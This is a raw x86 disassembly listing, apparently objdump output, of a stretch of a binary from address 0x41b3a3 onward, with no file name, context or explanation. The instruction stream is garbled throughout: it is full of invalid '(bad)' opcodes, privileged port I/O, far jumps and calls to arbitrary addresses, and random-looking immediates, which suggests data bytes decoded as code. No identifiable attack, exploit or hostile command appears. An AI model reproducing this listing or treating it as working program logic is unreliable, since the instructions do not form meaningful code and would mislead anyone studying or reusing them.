  41b3a3:	mov    ecx,0x12c830e1
  41b3a8:	pop    esi
  41b3a9:	mov    eax,0x86c861bc
  41b3ae:	or     eax,0x209ae59f
  41b3b3:	out    dx,al
  41b3b4:	ja     0x41b344
  41b3b6:	arpl   di,dx
  41b3b8:	pushf  
  41b3b9:	ret    0xc0bd
  41b3bc:	imul   ecx,DWORD PTR [esi-0x6fe93407],0xffffffe4
  41b3c3:	(bad)  
  41b3c4:	cmp    ebp,edx
  41b3c6:	pop    edx
  41b3c7:	data16 into 
  41b3c9:	mov    dl,BYTE PTR [ecx-0x6835cd9e]
  41b3cf:	pop    es
  41b3d0:	and    bh,BYTE PTR [eax+0x1a]
  41b3d3:	(bad)  
  41b3d4:	xchg   ecx,eax
  41b3d5:	(bad)  
  41b3d6:	adc    al,BYTE PTR [ecx]
  41b3d8:	data16 mov bh,0xd0
  41b3db:	imul   edx,esi,0x8f907017
  41b3e1:	dec    esi
  41b3e2:	fisttp WORD PTR [ebp-0x36]
  41b3e5:	into   
  41b3e6:	and    ebp,edx
  41b3e8:	mov    al,ds:0xb9446d14
  41b3ed:	(bad)  
  41b3ee:	sbb    bl,BYTE PTR [esi+0x19]
  41b3f1:	push   edi
  41b3f2:	mov    DWORD PTR [ecx],edi
  41b3f4:	pop    edx
  41b3f5:	aam    0x12
  41b3f7:	cmp    DWORD PTR [eax],ebx
  41b3f9:	pop    es
  41b3fa:	shl    DWORD PTR [ebp+0x3e],1
  41b3fd:	jno    0x41b3b9
  41b3ff:	aas    
  41b400:	add    BYTE PTR [edx-0x3e],0xbd
  41b404:	dec    ebx
  41b405:	repnz rcr ah,1
  41b408:	ss push es
  41b40a:	pop    ecx
  41b40b:	mov    cs,bx
  41b40e:	retf   
  41b40f:	jo     0x41b46b
  41b411:	xchg   ebx,eax
  41b412:	je     0x41b39d
  41b414:	pop    ecx
  41b415:	call   0x7d628d93
  41b41a:	push   ecx
  41b41b:	jnp    0x41b454
  41b41d:	mov    edx,eax
  41b41f:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41b421:	jbe    0x41b477
  41b423:	ds ja  0x41b3fc
  41b426:	mov    esi,0x8358c919
  41b42b:	pop    ebp
  41b42c:	jmp    0x41b475
  41b42e:	shl    edi,1
  41b430:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b431:	in     al,dx
  41b432:	and    cl,BYTE PTR [ecx+0x1f]
  41b435:	add    DWORD PTR [ebx-0x2f],ebx
  41b438:	push   cs
  41b439:	mov    ah,BYTE PTR [edi]
  41b43b:	pusha  
  41b43c:	scas   eax,DWORD PTR es:[edi]
  41b43d:	int    0x9f
  41b43f:	adc    ecx,DWORD PTR [edx+0x59fdee98]
  41b445:	inc    esp
  41b446:	outs   dx,DWORD PTR ds:[esi]
  41b447:	es mov ebp,0x16387674
  41b44d:	jbe    0x41b403
  41b44f:	loopne 0x41b4af
  41b451:	retf   
  41b452:	sbb    cl,BYTE PTR [edi-0xf]
  41b455:	sti    
  41b456:	add    edi,DWORD PTR [esi+0x37]
  41b459:	jmp    0x5c7f:0x7d3a4b74
  41b460:	(bad)  
  41b461:	push   ebp
  41b462:	and    al,0x31
  41b464:	adc    DWORD PTR [ecx],0xffffffd2
  41b467:	inc    ebp
  41b468:	mov    ch,0x1d
  41b46a:	and    bl,0x4a
  41b46d:	mov    eax,ds:0xe4433c56
  41b472:	pop    ecx
  41b473:	stc    
  41b474:	and    edi,DWORD PTR ds:0xa8a38e7b
  41b47a:	daa    
  41b47b:	jae    0x41b451
  41b47d:	dec    esi
  41b47e:	push   esi
  41b47f:	js     0x41b4d1
  41b481:	repz sub BYTE PTR [ebp-0x22],dh
  41b485:	in     al,0xb
  41b487:	retf   0x622b
  41b48a:	pop    esp
  41b48b:	outs   dx,BYTE PTR ds:[esi]
  41b48c:	pop    esp
  41b48d:	jns    0x41b46f
  41b48f:	imul   edi,DWORD PTR [eax],0x62d33bc0
  41b495:	shr    DWORD PTR [esi-0x75],cl
  41b498:	and    bl,al
  41b49a:	test   al,0xf
  41b49c:	pop    esp
  41b49d:	mov    dh,BYTE PTR [edx+eiz*4+0x34]
  41b4a1:	test   eax,0x5791650c
  41b4a6:	push   0x22
  41b4a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4a9:	dec    eax
  41b4aa:	inc    esi
  41b4ab:	fistp  QWORD PTR [eax]
  41b4ad:	sahf   
  41b4ae:	outs   dx,BYTE PTR ds:[esi]
  41b4af:	pop    edi
  41b4b0:	call   0xce92f0fe
  41b4b5:	nop
  41b4b6:	iret   
  41b4b7:	pushf  
  41b4b8:	mov    ebp,0xdfdb5c85
  41b4bd:	mov    ch,0x80
  41b4bf:	mov    ds:0xf59fcb17,eax
  41b4c4:	je     0x41b4e7
  41b4c6:	sti    
  41b4c7:	std    
  41b4c8:	jl     0x41b4ca
  41b4ca:	push   0x72662d1
  41b4cf:	or     eax,0xfb154cb9
  41b4d4:	stos   BYTE PTR es:[edi],al
  41b4d5:	ret    0x613e
  41b4d8:	jle    0x41b4ae
  41b4da:	pushf  
  41b4db:	mov    bh,0x34
  41b4dd:	repnz pop es
  41b4df:	inc    esp
  41b4e0:	mov    esp,0xd03dc2dd
  41b4e5:	out    0xd7,al
  41b4e7:	mov    esp,0xfe0e7da
  41b4ec:	mov    ss,WORD PTR [eax+0x6e]
  41b4ef:	xlat   BYTE PTR ds:[ebx]
  41b4f0:	loop   0x41b550
  41b4f2:	jg     0x41b560
  41b4f4:	shl    BYTE PTR [edx],cl
  41b4f6:	adc    ebx,esp
  41b4f8:	pop    ebx
  41b4f9:	mov    ?,WORD PTR [ecx]
  41b4fb:	adc    al,0xce
  41b4fd:	sbb    BYTE PTR [edi-0xe],bh
  41b500:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b501:	push   ss
  41b502:	push   esi
  41b503:	adc    eax,ecx
  41b505:	fdiv   QWORD PTR [edi]
  41b507:	or     ah,dh
  41b509:	jb     0x41b573
  41b50b:	pushf  
  41b50c:	pmuludq mm5,mm6
  41b50f:	bt     esi,0x3d
  41b513:	xchg   ecx,eax
  41b514:	sbb    DWORD PTR [ebp+eiz*2+0x3c1196cf],edi
  41b51b:	push   es
  41b51c:	scas   al,BYTE PTR es:[edi]
  41b51d:	pushf  
  41b51e:	ds inc ebx
  41b520:	push   cs
  41b521:	inc    esi
  41b522:	xor    ebp,0x34
  41b525:	imul   ebp,ebx,0xffffff99
  41b528:	jl     0x41b540
  41b52a:	ss mov ebp,0xf1602b5c
  41b530:	inc    ebp
  41b531:	addr16 aaa 
  41b533:	jmp    0xf1fd:0x149d758d
  41b53a:	mov    dh,0xaf
  41b53c:	add    eax,0xcee007b3
  41b541:	and    eax,0xf6aa34a5
  41b546:	and    BYTE PTR [edx-0x4767c270],cl
  41b54c:	mov    dh,0x96
  41b54e:	push   cs
  41b54f:	mul    BYTE PTR [esi]
  41b551:	aad    0x91
  41b553:	mov    cl,BYTE PTR [edx-0x6917360e]
  41b559:	jo     0x41b4e0
  41b55b:	leave  
  41b55c:	fimul  DWORD PTR [ecx+ebp*8-0xed6cb3e]
  41b563:	inc    eax
  41b564:	sub    DWORD PTR [esi+ebp*8-0x76149d87],esp
  41b56b:	in     eax,dx
  41b56c:	pop    ds
  41b56d:	cmp    cl,ah
  41b56f:	cli    
  41b570:	mov    ch,0xbc
  41b572:	dec    ecx
  41b573:	jns    0x41b530
  41b575:	xor    bl,bh
  41b577:	loop   0x41b509
  41b579:	fcmovnb st,st(1)
  41b57b:	fsubr  DWORD PTR [edi]
  41b57d:	mov    ah,0xd7
  41b57f:	mov    ds:0x6c10fdf3,al
  41b584:	push   eax
  41b585:	je     0x41b604
  41b587:	cmp    DWORD PTR [eax+0x3c8d765c],0x80d5a7e2
  41b591:	xor    eax,0x8570e97b
  41b596:	imul   edi,DWORD PTR es:[esp+ebp*8+0x4d],0x777cd2a0
  41b59f:	(bad)  
  41b5a0:	adc    eax,0x68605ac5
  41b5a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5a6:	or     eax,0x9bc9aaaa
  41b5ab:	ret    
  41b5ac:	jnp    0x41b587
  41b5ae:	stc    
  41b5af:	out    dx,eax
  41b5b0:	ret    0xf1e4
  41b5b3:	retf   
  41b5b4:	enter  0xd250,0xf0
  41b5b8:	mov    ds:0xc863537f,eax
  41b5bd:	jnp    0x41b544
  41b5bf:	or     BYTE PTR [ecx+0x25],al
  41b5c2:	lods   eax,DWORD PTR ds:[esi]
  41b5c3:	jecxz  0x41b569
  41b5c5:	xchg   ebx,eax
  41b5c6:	inc    esp
  41b5c7:	sbb    ebp,DWORD PTR [esi]
  41b5c9:	pop    ebx
  41b5ca:	jno    0x41b5b0
  41b5cc:	lea    ecx,[ebp+edx*4+0x225c1a63]
  41b5d3:	out    0x62,eax
  41b5d5:	into   
  41b5d6:	xlat   BYTE PTR ds:[ebx]
  41b5d7:	(bad)  
  41b5d9:	mov    ebx,0xa39c8371
  41b5de:	mov    ecx,0x1812754b
  41b5e3:	cdq    
  41b5e4:	setno  al
  41b5e7:	xor    BYTE PTR [ecx*8-0x766dd7ae],bl
  41b5ee:	loope  0x41b60c
  41b5f0:	in     al,0x21
  41b5f2:	pop    eax
  41b5f3:	lea    ebx,[ebp-0x1c9107ce]
  41b5f9:	inc    ebp
  41b5fa:	retf   0xff85
  41b5fd:	cmp    DWORD PTR [ecx-0x48],eax
  41b600:	fidiv  DWORD PTR [ebx+ecx*4-0x54]
  41b604:	push   0x22c09102
  41b609:	xlat   BYTE PTR ds:[ebx]
  41b60a:	(bad)  [eax]
  41b60c:	(bad)  
  41b60d:	xchg   edi,eax
  41b60e:	repz (bad) 
  41b610:	iret   
  41b611:	sbb    DWORD PTR ds:0x75b6e082,ecx
  41b617:	add    eax,0x4533326
  41b61c:	(bad)  
  41b61d:	mov    bl,0x6d
  41b61f:	das    
  41b620:	xchg   edi,eax
  41b621:	cmp    al,0xcf
  41b623:	stos   DWORD PTR es:[edi],eax
  41b624:	adc    al,dl
  41b626:	adc    eax,DWORD PTR [esi]
  41b628:	retf   0x29e2
  41b62b:	(bad)  
  41b62c:	adc    al,0x1c
  41b62e:	addr16 pop ebp
  41b630:	addr16 call 0x6e58:0xc814a339
  41b638:	and    ah,ch
  41b63a:	jo     0x41b628
  41b63c:	mov    fs,WORD PTR [esi]
  41b63e:	aad    0xb9
  41b640:	push   0x1e
  41b642:	pop    ss
  41b643:	(bad)  
  41b644:	lea    esi,[ebx]
  41b646:	sub    al,0x5e
  41b648:	fcmove st,st(4)
  41b64a:	mov    bh,0xde
  41b64c:	adc    BYTE PTR [ebp+eiz*1-0x483f2103],bl
  41b653:	fstp   QWORD PTR [ebx+0x57]
  41b656:	mov    ecx,0xb68990ab
  41b65b:	shl    DWORD PTR [esi],1
  41b65d:	test   BYTE PTR [eax-0x4b0ad80],bl
  41b663:	aas    
  41b664:	sti    
  41b665:	adc    eax,0xc7626bbb
  41b66a:	mov    esp,ds
  41b66c:	aas    
  41b66d:	std    
  41b66e:	adc    eax,0xa1abfb1
  41b673:	lock mov ds:0x98041e3,al
  41b679:	or     eax,0x6586e37e
  41b67e:	lods   al,BYTE PTR ds:[esi]
  41b67f:	mov    ah,0x6f
  41b681:	call   0xb061133e
  41b686:	sub    DWORD PTR fs:[eax-0x62],esi
  41b68a:	push   es
  41b68b:	and    ch,bl
  41b68d:	in     eax,0x52
  41b68f:	xor    eax,0x4ba04700
  41b694:	xchg   bp,ax
  41b696:	and    BYTE PTR [edx],0xab
  41b699:	les    ebx,FWORD PTR [edi+ecx*8-0x3f89e4ab]
  41b6a0:	cdq    
  41b6a1:	mov    ebp,0xbb41ae50
  41b6a6:	int    0x9
  41b6a8:	inc    esp
  41b6a9:	cmp    bl,dh
  41b6ab:	mov    dh,0x87
  41b6ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6ae:	dec    ebp
  41b6af:	imul   esp,ebx,0x3c9db622
  41b6b5:	(bad)  
  41b6b6:	clc    
  41b6b7:	add    BYTE PTR [ecx],ch
  41b6b9:	aam    0x3c
  41b6bb:	in     eax,dx
  41b6bc:	(bad)  
  41b6bd:	push   ss
  41b6be:	cmp    BYTE PTR [edx-0x7ed743a8],0x9a
  41b6c5:	mov    cl,0xe3
  41b6c7:	aam    0x10
  41b6c9:	mov    DWORD PTR [ecx-0x5],esp
  41b6cc:	and    BYTE PTR [edx+0x3d],bh
  41b6cf:	aam    0xd1
  41b6d1:	fisttp WORD PTR [ecx+0x18b83dd0]
  41b6d7:	adc    eax,0xddeb5ae3
  41b6dc:	and    dl,BYTE PTR [esp+eax*8+0x5cb39ddd]
  41b6e3:	fld    st(1)
  41b6e5:	or     dl,BYTE PTR [ebx]
  41b6e7:	fs popf 
  41b6e9:	es neg ebp
  41b6ec:	call   0x276e:0x7a0bbf09
  41b6f3:	mov    ds:0xa69254a7,eax
  41b6f8:	push   edx
  41b6f9:	jno    0x41b738
  41b6fb:	dec    ebp
  41b6fc:	and    esp,DWORD PTR [eax+0xb41cbd]
  41b702:	stc    
  41b703:	cld    
  41b704:	fild   QWORD PTR [edx]
  41b706:	repnz sub al,0xa9
  41b709:	leave  
  41b70a:	pop    ds
  41b70b:	test   ch,ch
  41b70d:	(bad)  
  41b70e:	sahf   
  41b70f:	mov    edi,0x8054a353
  41b714:	jne    0x41b773
  41b716:	dec    edi
  41b717:	push   ds
  41b718:	das    
  41b719:	(bad)  
  41b71a:	daa    
  41b71b:	jnp    0x41b71e
  41b71d:	cmp    eax,0xb93a0a7
  41b722:	and    BYTE PTR [ecx-0x6c7f0eac],cl
  41b728:	sbb    edx,DWORD PTR [edi+edx*2]
  41b72b:	shl    BYTE PTR [ecx+ebp*1],0x6a
  41b72f:	mov    ah,0x9e
  41b731:	push   eax
  41b732:	jg     0x41b731
  41b734:	shl    BYTE PTR [ebp+0x70bbd9c4],1
  41b73a:	adc    BYTE PTR [esi+0x66],0x97
  41b73e:	jo     0x41b79a
  41b740:	and    eax,0x582fd96f
  41b745:	jmp    DWORD PTR [eax+0x2b]
  41b748:	mov    esp,0xf99b1d22
  41b74d:	pop    ebp
  41b74e:	mov    dh,0xa7
  41b750:	sbb    al,BYTE PTR [esi+0x43]
  41b753:	js     0x41b726
  41b755:	dec    edx
  41b756:	cmp    eax,DWORD PTR [eax]
  41b758:	sbb    cl,BYTE PTR [ebp-0x38]
  41b75b:	sub    edi,esp
  41b75d:	mov    DWORD PTR [eax-0x3e6606b9],eax
  41b763:	leave  
  41b764:	rol    BYTE PTR [ebx+0x65d4bdb2],1
  41b76a:	jbe    0x41b78f
  41b76c:	js     0x41b74b
  41b76e:	popa   
  41b76f:	xchg   ecx,eax
  41b770:	adc    edx,edi
  41b772:	jnp    0x41b7a2
  41b774:	xchg   edi,eax
  41b775:	retf   
  41b776:	xor    eax,0xf5da8667
  41b77b:	dec    esi
  41b77c:	push   eax
  41b77d:	mov    al,0xdd
  41b77f:	jecxz  0x41b7e3
  41b781:	sbb    dh,BYTE PTR [ebx+0x23f035d4]
  41b787:	adc    eax,0x24
  41b78a:	fsub   QWORD PTR [edx]
  41b78c:	sbb    dl,ch
  41b78e:	fld    TBYTE PTR [esi-0x6019b91d]
  41b794:	fcmovb st,st(1)
  41b796:	shr    cl,1
  41b798:	fwait
  41b799:	or     al,0x3a
  41b79b:	retf   
  41b79c:	dec    edi
  41b79d:	jge    0x41b812
  41b79f:	dec    edx
  41b7a0:	loopne 0x41b7a6
  41b7a2:	jo     0x41b7bb
  41b7a4:	clc    
  41b7a5:	push   eax
  41b7a6:	lods   eax,DWORD PTR ds:[esi]
  41b7a7:	sbb    ah,bl
  41b7a9:	mov    ecx,0x3454b48e
  41b7ae:	lods   al,BYTE PTR ds:[esi]
  41b7af:	mov    eax,ds:0xf2a95a61
  41b7b4:	dec    edi
  41b7b5:	dec    eax
  41b7b6:	mov    edx,0x3d422965
  41b7bb:	inc    ebx
  41b7bc:	js     0x41b7e0
  41b7be:	xchg   DWORD PTR [ecx],eax
  41b7c0:	cwde   
  41b7c1:	mul    DWORD PTR [ecx]
  41b7c3:	sub    DWORD PTR [esi],ecx
  41b7c5:	jecxz  0x41b7a1
  41b7c7:	adc    al,0x52
  41b7c9:	nop
  41b7ca:	addr16 jo 0x41b83a
  41b7cd:	mov    ebp,0xe6051705
  41b7d2:	xlat   BYTE PTR ds:[ebx]
  41b7d3:	push   ebx
  41b7d4:	sbb    al,0x2
  41b7d6:	jmp    0xcbae:0xb1e724f8
  41b7dd:	outs   dx,DWORD PTR ds:[esi]
  41b7de:	loope  0x41b7b6
  41b7e0:	cmp    DWORD PTR [ecx-0x5c5dfcfe],eax
  41b7e6:	mov    edi,ebp
  41b7e8:	lea    ebx,[edi]
  41b7ea:	pop    esp
  41b7eb:	mov    al,0x90
  41b7ed:	pop    ebp
  41b7ee:	(bad)  
  41b7ef:	ficomp DWORD PTR [esi+0x2281d36c]
  41b7f5:	pushw  ds
  41b7f7:	inc    ecx
  41b7f8:	adc    ah,dl
  41b7fa:	pop    ecx
  41b7fb:	dec    edi
  41b7fc:	dec    ebp
  41b7fd:	pop    ebp
  41b7fe:	rcl    ebx,0x55
  41b801:	fcmovnu st,st(2)
  41b803:	dec    ecx
  41b804:	adc    ebp,DWORD PTR [ebx+edx*4+0x56]
  41b808:	je     0x41b80d
  41b80a:	xchg   BYTE PTR [ebx-0x1f],bh
  41b80d:	(bad)  
  41b80e:	xchg   edi,eax
  41b80f:	add    eax,0x44c7dd6f
  41b814:	inc    esp
  41b815:	adc    al,0x95
  41b817:	retf   
  41b818:	pushf  
  41b819:	fst    DWORD PTR [ebp+0x41b344db]
  41b81f:	push   0xb924c6b2
  41b824:	leave  
  41b825:	pop    ss
  41b826:	jno    0x41b84f
  41b828:	adc    dh,0xe3
  41b82b:	add    al,0xf8
  41b82d:	(bad)  
  41b82e:	mov    ah,BYTE PTR ss:[edx-0x4acacbdc]
  41b835:	in     eax,0x9a
  41b837:	and    al,0x34
  41b839:	inc    edx
  41b83a:	or     ah,dh
  41b83c:	mov    WORD PTR [edx-0x4f],cs
  41b83f:	cs int3 
  41b841:	push   edi
  41b842:	jmp    0x41b80f
  41b844:	xchg   BYTE PTR [ebp-0x78],dh
  41b847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b848:	mov    es,WORD PTR [ebx]
  41b84a:	out    dx,eax
  41b84b:	and    DWORD PTR [ecx+0x50ac43ac],esi
  41b851:	outs   dx,DWORD PTR ds:[esi]
  41b852:	adc    BYTE PTR [edx],bh
  41b854:	mov    edi,DWORD PTR [edx]
  41b856:	icebp  
  41b857:	fs xchg ecx,eax
  41b859:	or     BYTE PTR [esi],al
  41b85b:	nop
  41b85c:	std    
  41b85d:	pusha  
  41b85e:	inc    ecx
  41b85f:	lods   al,BYTE PTR ds:[esi]
  41b860:	std    
  41b861:	rol    BYTE PTR [edx],cl
  41b863:	ins    DWORD PTR es:[edi],dx
  41b864:	cdq    
  41b865:	data16 (bad) 
  41b867:	jmp    0x58d19211
  41b86c:	pusha  
  41b86d:	cld    
  41b86e:	adc    ebp,DWORD PTR [ebx+0x37]
  41b871:	add    eax,0xe1defaad
  41b876:	(bad)  
  41b877:	sub    ecx,ebx
  41b879:	jno    0x41b824
  41b87b:	pusha  
  41b87c:	mov    ebx,0x84d48d0
  41b881:	ror    BYTE PTR [esi-0xb035ede],1
  41b887:	repnz mov eax,ds:0xff1ec721
  41b88d:	aas    
  41b88e:	push   0xffffffad
  41b890:	jb     0x41b8ef
  41b892:	sti    
  41b893:	adc    eax,edi
  41b895:	cmp    eax,0xfe4dee3e
  41b89a:	lods   al,BYTE PTR ds:[esi]
  41b89b:	ret    0x235e
  41b89e:	mov    esp,0x30df1ffd
  41b8a3:	jg     0x41b859
  41b8a5:	or     eax,0xbbd73fe5
  41b8aa:	inc    esp
  41b8ab:	fnstsw WORD PTR [esi+0x53]
  41b8ae:	inc    edx
  41b8af:	push   cs
  41b8b0:	mov    ah,0xf6
  41b8b2:	jns    0x41b873
  41b8b4:	pop    es
  41b8b5:	sbb    DWORD PTR [esp+edx*2],ebp
  41b8b8:	rcl    BYTE PTR [eax+0x2cfa26d5],cl
  41b8be:	das    
  41b8bf:	mov    esp,ebp
  41b8c1:	es push ss
  41b8c3:	sbb    DWORD PTR [ecx],esi
  41b8c5:	(bad)  
  41b8c6:	jmp    0xb0930ae0
  41b8cb:	mov    ecx,0xa15346d0
  41b8d0:	adc    al,ch
  41b8d2:	(bad)  [edx+0x6f8354a5]
  41b8d8:	shl    BYTE PTR [edi-0x1ef60a8d],0xe4
  41b8df:	jae    0x41b8e4
  41b8e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8e2:	sar    DWORD PTR [ebx],cl
  41b8e4:	xor    al,0x59
  41b8e6:	mov    edx,0x6103d234
  41b8eb:	and    al,0x17
  41b8ed:	and    al,0xad
  41b8ef:	aam    0x28
  41b8f1:	pop    edx
  41b8f2:	popf   
  41b8f3:	mov    ds:0x6d65b0a6,eax
  41b8f8:	lock xor DWORD PTR [eax],eax
  41b8fb:	jnp    0x41b8d6
  41b8fd:	pusha  
  41b8fe:	cmp    DWORD PTR [eax+eiz*8+0x6aa15820],ebx
  41b905:	dec    ebp
  41b906:	jge    0x41b8cc
  41b908:	pop    es
  41b909:	add    al,0x96
  41b90b:	leave  
  41b90c:	in     al,dx
  41b90d:	lds    ebx,FWORD PTR [ebx+0x61]
  41b910:	dec    edx
  41b911:	int    0xb0
  41b913:	adc    BYTE PTR [esp+ebp*4-0xb048811],bl
  41b91a:	cdq    
  41b91b:	xchg   ecx,eax
  41b91c:	add    BYTE PTR [esi+ebx*1-0x77],dh
  41b920:	es dec ebx
  41b922:	into   
  41b923:	sub    dh,BYTE PTR [ecx+eax*8-0x76283fe5]
  41b92a:	stc    
  41b92b:	pop    edi
  41b92c:	pop    DWORD PTR [esi+0x58]
  41b92f:	or     ch,BYTE PTR [ecx+0x77]
  41b932:	into   
  41b933:	mov    ebx,0x4f62f080
  41b938:	jo     0x41b8e6
  41b93a:	mov    eax,ss
  41b93c:	outs   dx,BYTE PTR ds:[esi]
  41b93d:	mov    ebx,0x755611da
  41b942:	mov    bl,0x93
  41b944:	or     ebp,DWORD PTR [eax+esi*8+0x51]
  41b948:	ficom  DWORD PTR [ebx]
  41b94a:	hlt    
  41b94b:	fneni(8087 only) 
  41b94d:	out    0xb2,eax
  41b94f:	jg     0x41b963
  41b951:	fld    TBYTE PTR [edi+0x197b590a]
  41b957:	sbb    cl,bl
  41b959:	call   0x35fba405
  41b95e:	cld    
  41b95f:	fcom   DWORD PTR [ebx+esi*4+0x4d]
  41b963:	and    dh,cl
  41b965:	mov    WORD PTR [eax],cs
  41b967:	push   eax
  41b968:	nop
  41b969:	jmp    0x2c391697
  41b96e:	cmp    dh,0xe5
  41b971:	mov    al,0x1c
  41b973:	shl    DWORD PTR [eax-0x50932f79],0x85
  41b97a:	loope  0x41b98f
  41b97c:	xchg   ebx,eax
  41b97d:	or     eax,DWORD PTR [ebp-0x261169cf]
  41b983:	ins    DWORD PTR es:[edi],dx
  41b984:	or     DWORD PTR [edx-0x5e42ce9d],0xffffff96
  41b98b:	les    esp,FWORD PTR [edx-0x7f9a9dd]
  41b991:	xlat   BYTE PTR ds:[ebx]
  41b992:	lahf   
  41b993:	jns    0x41b9c8
  41b995:	sub    DWORD PTR [ebx+0x22],edi
  41b998:	out    0x58,eax
  41b99a:	les    eax,FWORD PTR [ebx+0x3162c9d]
  41b9a0:	pop    ebx
  41b9a1:	ficomp WORD PTR [eax]
  41b9a3:	in     al,0xb1
  41b9a5:	lock das 
  41b9a7:	pop    ds
  41b9a8:	test   eax,0xa4479c8e
  41b9ad:	jmp    0x1870:0xd8af62a8
  41b9b4:	mov    bl,0xf9
  41b9b6:	mov    cl,0xab
  41b9b8:	pusha  
  41b9b9:	adc    eax,0xe82683a6
  41b9be:	push   edi
  41b9bf:	je     0x41b99c
  41b9c1:	fdiv   DWORD PTR [ebx+eiz*8-0x3743a7c5]
  41b9c8:	cwde   
  41b9c9:	lods   al,BYTE PTR ds:[esi]
  41b9ca:	sbb    ecx,esp
  41b9cc:	or     esp,ebp
  41b9ce:	xchg   esp,eax
  41b9cf:	shr    BYTE PTR [eax],0xe7
  41b9d2:	repz ficomp DWORD PTR [ebx-0x7c]
  41b9d7:	cmp    eax,0x215d1c2d
  41b9dc:	pop    ebp
  41b9dd:	adc    BYTE PTR [ecx-0x21],ah
  41b9e0:	imul   edx,DWORD PTR [ebx-0x73],0x12
  41b9e4:	outs   dx,DWORD PTR ds:[esi]
  41b9e5:	add    eax,eax
  41b9e7:	test   eax,edi
  41b9e9:	cmp    al,BYTE PTR [ebx]
  41b9eb:	mov    DWORD PTR [ecx-0x16616f66],ebp
  41b9f1:	adc    al,0x35
  41b9f3:	adc    al,0xc2
  41b9f5:	pop    esp
  41b9f6:	mov    edi,0xc787e555
  41b9fb:	jns    0x41ba20
  41b9fd:	add    al,0xb6
  41b9ff:	imul   esi,DWORD PTR [ecx+0x5afa9b82],0xffffff86
  41ba06:	(bad)  
  41ba08:	adc    ecx,DWORD PTR [edi]
  41ba0a:	popf   
  41ba0b:	(bad)  
  41ba0c:	in     al,dx
  41ba0d:	sbb    BYTE PTR [ebp-0x31],0x98
  41ba11:	lds    edx,FWORD PTR [ebx-0x12a8236e]
  41ba17:	mov    ebx,0xb2b29cd3
  41ba1d:	test   eax,0x9b6a791e
  41ba22:	scas   al,BYTE PTR es:[edi]
  41ba23:	lahf   
  41ba24:	mov    DWORD PTR [esi-0x40],eax
  41ba27:	dec    edx
  41ba28:	cli    
  41ba29:	int    0x27
  41ba2b:	push   ebp
  41ba2c:	inc    edx
  41ba2d:	and    edx,DWORD PTR [ebx+ecx*8-0x7b]
  41ba31:	retf   
  41ba32:	cmp    BYTE PTR [edx+0x2cc2632e],bh
  41ba38:	repz mov ds:0xbcb46d64,al
  41ba3e:	mov    ebx,0xfdc0c86f
  41ba43:	pusha  
  41ba44:	jns    0x41bab2
  41ba46:	mov    al,ds:0xeab3053f
  41ba4b:	imul   edi,DWORD PTR [edx],0xf0c7599e
  41ba51:	or     eax,0x3334abdb
  41ba56:	outs   dx,DWORD PTR ds:[esi]
  41ba57:	or     BYTE PTR [ecx-0x20],bh
  41ba5a:	dec    esp
  41ba5b:	(bad)  
  41ba5c:	out    0x39,al
  41ba5e:	mov    al,ds:0x39e91710
  41ba63:	xor    eax,0x1e7b0fe6
  41ba68:	(bad)  
  41ba69:	mov    dh,0xe5
  41ba6b:	cli    
  41ba6c:	mov    ch,0xfb
  41ba6e:	and    al,0x90
  41ba70:	scas   al,BYTE PTR es:[edi]
  41ba71:	repnz sub BYTE PTR [edx+0x4d6abcef],bl
  41ba78:	adc    ch,BYTE PTR [edx]
  41ba7a:	nop
  41ba7b:	sbb    BYTE PTR [edi+ebx*1],dh
  41ba7e:	cmp    bh,ah
  41ba80:	xchg   esp,eax
  41ba81:	hlt    
  41ba82:	or     al,0xca
  41ba84:	xchg   dl,al
  41ba86:	shl    BYTE PTR [ebp+eax*4-0x8b4f40d],cl
  41ba8d:	call   0xdba538ba
  41ba92:	icebp  
  41ba93:	dec    edi
  41ba94:	xchg   ebp,eax
  41ba95:	push   cs
  41ba96:	push   cs
  41ba97:	data16 mov BYTE PTR [ebp-0x1b9f4a61],ch
  41ba9e:	shl    DWORD PTR [edx+0x2fe36b6b],1
  41baa4:	sbb    al,0x7a
  41baa6:	fistp  WORD PTR [ebx+edx*4]
  41baa9:	fwait
  41baaa:	pop    edi
  41baab:	or     dl,BYTE PTR [esi]
  41baad:	fistp  DWORD PTR [edi]
  41baaf:	loopne 0x41ba6f
  41bab1:	call   0xad3cd796
  41bab6:	cmc    
  41bab7:	or     eax,0x57b1748f
  41babc:	sub    ch,BYTE PTR [eax+0x4f]
  41babf:	mov    esp,0x313a7732
  41bac5:	add    bh,bl
  41bac7:	jg     0x41bab7
  41bac9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41baca:	jl     0x41bafe
  41bacc:	jno    0x41bb47
  41bace:	push   ss
  41bacf:	adc    DWORD PTR [ecx+0x4f57816e],ecx
  41bad5:	push   ebx
  41bad6:	inc    ecx
  41bad7:	mov    BYTE PTR [ecx+0x76],cl
  41bada:	mov    bl,0xa2
  41badc:	or     al,0xb8
  41bade:	fadd   QWORD PTR [esi+eiz*1]
  41bae1:	push   ebp
  41bae2:	xor    DWORD PTR [edi],eax
  41bae4:	inc    eax
  41bae5:	dec    eax
  41bae6:	mov    cl,0x9
  41bae8:	ret    
  41bae9:	leave  
  41baea:	lahf   
  41baeb:	inc    eax
  41baec:	mov    ah,ah
  41baee:	sar    BYTE PTR [ebx-0x62fa838e],0x58
  41baf5:	in     al,0xba
  41baf7:	push   edi
  41baf8:	push   ebp
  41baf9:	xchg   ebx,eax
  41bafa:	popf   
  41bafb:	mov    dh,dh
  41bafd:	popa   
  41bafe:	ins    BYTE PTR es:[edi],dx
  41baff:	cmp    dh,BYTE PTR [ebp+0x56e8afd7]
  41bb05:	or     al,0x88
  41bb07:	lods   al,BYTE PTR ds:[esi]
  41bb08:	fwait
  41bb09:	lods   eax,DWORD PTR ds:[esi]
  41bb0a:	push   esi
  41bb0b:	rol    BYTE PTR [ecx-0x67],cl
  41bb0e:	mov    esi,0xa3c3bc9e
  41bb13:	aad    0xc5
  41bb15:	lds    ebp,FWORD PTR [edi+edx*2]
  41bb18:	scas   al,BYTE PTR es:[edi]
  41bb19:	(bad)  
  41bb1a:	(bad)  
  41bb1b:	into   
